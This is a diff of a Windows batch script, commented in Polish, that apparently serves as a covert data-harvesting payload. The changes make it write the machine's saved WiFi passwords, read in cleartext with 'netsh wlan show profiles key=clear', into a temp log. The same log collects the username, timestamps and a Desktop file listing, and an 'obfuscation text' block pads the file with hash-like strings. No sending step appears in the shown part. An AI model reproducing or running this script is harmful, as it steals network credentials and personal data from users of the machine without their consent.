@@ -3,18 +3,19 @@ cmd.exe /Q /c whoami 1> %TEMP%\w1.txt 2>%TEMP%\w2.txt
 cmd /Q /c  echo %date%_%time%               1>> %TEMP%\w1.txt
 
 REM Echo Odczytanie hasełWiFi
-for /f "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles') do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear
+for /f "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles') do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear 1>> %TEMP%\w1.txt
+
 REM ECHO usuniecie procesu Google Chrome
 REM taskkill /f /im chrome.exe
 
 ECHO Print FAVORITES / Desktop
-dir /s /b %USERPROFILE%\Favorites >>1 %TEMP%\w1.txt
+REM dir /s /b %USERPROFILE%\Favorites >>1 %TEMP%\w1.txt
 dir /s /b %USERPROFILE%\desktop >>1 %TEMP%\w1.txt
 
 REM Echo Odczytanie wybranych danych Systeminfo
 REM cmd /q /c systeminfo| findstr "Time"        1>> %TEMP%\w1.txt
 
-echo 
+echo 1>> %TEMP%\w1.txt
 echo obfuscation text
 echo 200ceb26807d6bf99fd6f4f0d1ca54d4       1>> %TEMP%\w1.txt
 echo d41d8cd9 8f00b204 e9800998 ecf8427e    1>> %TEMP%\w1.txt
